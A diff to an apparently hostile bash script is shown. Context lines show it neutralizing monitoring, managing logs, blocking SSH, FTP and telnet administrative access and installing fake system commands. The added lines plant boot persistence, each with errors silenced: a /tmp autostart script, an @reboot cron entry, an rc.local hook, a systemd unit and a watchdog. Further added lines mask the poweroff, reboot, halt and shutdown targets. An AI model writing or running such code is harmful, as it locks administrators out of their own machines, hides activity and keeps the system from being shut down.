@@ -821,14 +821,78 @@ neutralize_monitoring
 
 manage_logs
 
-echo -e "${GREEN}Starting web services...${NC}"
-for service in apache2 httpd nginx; do
-    if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/etc/init.d/${service}" ]; then
-        service_command enable $service
-        service_command start $service
-        echo -e "${GREEN}$service started [DONE]${NC}"
+echo -e "${GREEN}Setting up CRITICAL boot persistence for web services...${NC}"
+
+for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma tomcat tomcat8 tomcat9; do
+    if command_exists $service || [ -f "/etc/init.d/$service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ]; then
+        
+        service_command enable $service 2>/dev/null
+        service_command start $service 2>/dev/null
+        
+        if [ -d /etc/systemd/system ]; then
+            systemctl enable $service 2>/dev/null
+            systemctl start $service 2>/dev/null
+        fi
+        
+        if [ -d /etc/rc2.d ] && [ -f "/etc/init.d/$service" ]; then
+            ln -sf /etc/init.d/$service /etc/rc2.d/S99$service 2>/dev/null
+            ln -sf /etc/init.d/$service /etc/rc3.d/S99$service 2>/dev/null
+            ln -sf /etc/init.d/$service /etc/rc4.d/S99$service 2>/dev/null
+            ln -sf /etc/init.d/$service /etc/rc5.d/S99$service 2>/dev/null
+        fi
+        
+        echo -e "${GREEN}✓ $service configured for boot [DONE]${NC}"
     fi
 done
+
+cat > /tmp/web_autostart.sh << 'AUTOSTART'
+#!/bin/bash
+sleep 5
+for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma tomcat tomcat8 tomcat9; do
+    systemctl start $service 2>/dev/null || service $service start 2>/dev/null || /etc/init.d/$service start 2>/dev/null
+done
+/tmp/web_watchdog.sh >/dev/null 2>&1 &
+AUTOSTART
+
+chmod +x /tmp/web_autostart.sh
+
+if ! crontab -l 2>/dev/null | grep -q "web_autostart.sh"; then
+    (crontab -l 2>/dev/null; echo "@reboot /tmp/web_autostart.sh >/dev/null 2>&1") | crontab - 2>/dev/null
+fi
+
+if [ -f /etc/rc.local ]; then
+    if ! grep -q "web_autostart.sh" /etc/rc.local 2>/dev/null; then
+        sed -i '/^exit 0/i /tmp/web_autostart.sh \&' /etc/rc.local 2>/dev/null
+    fi
+else
+    cat > /etc/rc.local << 'RCLOCAL'
+#!/bin/bash
+/tmp/web_autostart.sh &
+exit 0
+RCLOCAL
+    chmod +x /etc/rc.local 2>/dev/null
+fi
+
+if [ -d /etc/systemd/system ]; then
+    cat > /etc/systemd/system/web-autostart.service << 'AUTOSERVICE'
+[Unit]
+Description=Web Services Autostart
+After=network.target
+
+[Service]
+Type=forking
+ExecStart=/tmp/web_autostart.sh
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+AUTOSERVICE
+    
+    systemctl daemon-reload 2>/dev/null
+    systemctl enable web-autostart.service 2>/dev/null
+fi
+
+echo -e "${GREEN}Web services boot persistence established [DONE]${NC}"
 
 echo -e "${GREEN}Blocking administrative channels...${NC}"
 for service in ssh sshd vsftpd proftpd pure-ftpd telnetd; do
@@ -990,9 +1054,10 @@ FAKE_CMD
     chmod +x /usr/local/bin/$cmd 2>/dev/null
 done
 
+
 if [ -d /etc/systemd/system ]; then
-    for target in poweroff.target reboot.target halt.target shutdown.target rescue.target emergency.target; do
-        ln -sf /dev/null /etc/systemd/system/$target 2>/dev/null
+    for target in poweroff.target reboot.target halt.target shutdown.target; do
+        systemctl mask $target 2>/dev/null
     done
     systemctl daemon-reload 2>/dev/null
 fi
